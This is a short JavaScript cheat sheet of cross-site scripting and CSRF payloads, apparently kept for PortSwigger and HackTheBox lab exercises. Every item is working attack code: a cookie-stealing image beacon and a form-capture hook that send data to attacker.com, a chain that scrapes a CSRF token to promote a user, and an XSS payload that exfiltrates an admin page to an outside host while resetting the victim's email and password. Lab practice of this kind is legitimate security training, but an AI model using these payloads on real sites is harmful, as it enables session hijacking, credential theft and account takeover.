//CHECK PORTSWIGGER LABS PAYLOADS
// 2. Stealing Cookies
//Capture and exfiltrate cookies to an external server.

  var img = new Image();
  img.src = 'http://attacker.com/steal-cookie?cookie=' + document.cookie;


// 9. Capturing Form Data
//Capture and send form data to an external server.

  var form = document.forms[0];
  form.onsubmit = function() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://attacker.com/capture", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(new URLSearchParams(new FormData(form)).toString());
  };


// 10. CSRF cookie stealing + CSRF (may fail)
// Steals CSRF cookie if ACAO header is present and bypasses csrf protection, uses fetch method.

fetch('https://vulnerablesite.htb/profile.php', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(data, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // Do CSRF
    return fetch('https://vulnerablesite.htb/profile.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        credentials: 'include',
        body: `promote=htb-stdnt&csrf=${csrftoken}`
    });
})

// Also can be used directly in XSS payloads

fetch('/home.php', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  var parser = new DOMParser();
  var doc = parser.parseFromString(data, 'text/html');
  var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);
  fetch('/admin.php', {
      method: 'GET',
      credentials: 'include'
  })
  .then(response => response.text())
  .then(data => {
      fetch('http://exfiltrate.htb:51255/exfil?r='+btoa(data));
  });
  fetch('/home.php', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
      },
      credentials: 'include',
      body: `email=test%40vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}`
  });
});